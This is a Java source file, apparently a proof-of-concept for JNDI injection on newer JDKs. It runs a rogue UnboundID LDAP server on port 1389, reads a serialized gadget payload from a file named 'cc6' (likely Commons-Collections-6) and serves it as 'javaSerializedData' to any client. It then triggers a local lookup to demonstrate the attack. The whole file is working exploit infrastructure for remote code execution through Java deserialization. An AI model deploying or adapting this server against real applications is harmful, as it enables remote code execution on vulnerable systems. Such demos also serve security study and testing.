package run.ergou.jndi.high;

import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;

import javax.naming.InitialContext;
import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.io.FileInputStream;
import java.net.InetAddress;

public class Deserialize {
    private final static String baseDN = "dc=ergou,dc=run";

    public static void main(String[] args) throws Exception {
        InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(baseDN);
        config.setListenerConfigs(new InMemoryListenerConfig(
                "listenName",
                InetAddress.getByName("0.0.0.0"),
                1389,
                ServerSocketFactory.getDefault(),
                SocketFactory.getDefault(),
                (SSLSocketFactory) SSLSocketFactory.getDefault()
        ));
        config.addInMemoryOperationInterceptor(new OperationInterceptor());
        InMemoryDirectoryServer inMemoryDirectoryServer = new InMemoryDirectoryServer(config);
        inMemoryDirectoryServer.startListening();

        InitialContext context = new InitialContext();
        context.lookup("ldap://127.0.0.1:1389/any");
    }

    private static class OperationInterceptor extends InMemoryOperationInterceptor {

        @Override
        public void processSearchResult(InMemoryInterceptedSearchResult result) {
            // 反序列化Payload
            byte[] javaSerializedData = new byte[0];
            try {
                FileInputStream cc6 = new FileInputStream("cc6");
                javaSerializedData = new byte[cc6.available()];
                int n = cc6.read(javaSerializedData);
            } catch (Exception e) {
                e.printStackTrace();
            }
            
            Entry entry = new Entry(baseDN);
            entry.addAttribute("javaClassName", "Obj");
            // javaSerializedData属性
            entry.addAttribute("javaSerializedData", javaSerializedData);

            try {
                result.sendSearchEntry(entry);
                result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
            } catch (Exception exception) {
                exception.printStackTrace();
            }

        }


    }
}
